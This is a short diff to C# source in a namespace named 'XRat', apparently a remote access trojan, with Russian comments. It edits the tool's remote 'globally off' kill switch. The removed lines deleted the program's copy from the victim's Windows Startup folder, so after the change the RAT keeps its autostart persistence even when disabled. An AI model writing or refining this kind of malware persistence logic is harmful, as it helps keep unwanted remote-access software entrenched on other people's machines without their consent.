@@ -277,23 +277,7 @@ namespace XRat
                 if (valid == "false")
                 {
                     Console.WriteLine("Globally off");
-
-                    string username = ProCMD("whoami").output;
-                    username = username.Split('\\')[1];
-
-                    string autostartPath = $@"C:\Users\{username}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{Settings.filename + ".exe"}";
-                    string command = $"del \"{autostartPath}\"";  // Используем кавычки для корректной работы с путями
-
-                    // Проверяем успешность выполнения команды
-                    if (ProCMD(command).success)
-                    {
-                        Console.WriteLine("Success");
-                    }
-                    else
-                    {
-                        Console.WriteLine("Failed");
-                    }
-
+                    
                     // Завершаем выполнение программы (можно заменить на корректный выход)
                     Environment.Exit(0);
                 }
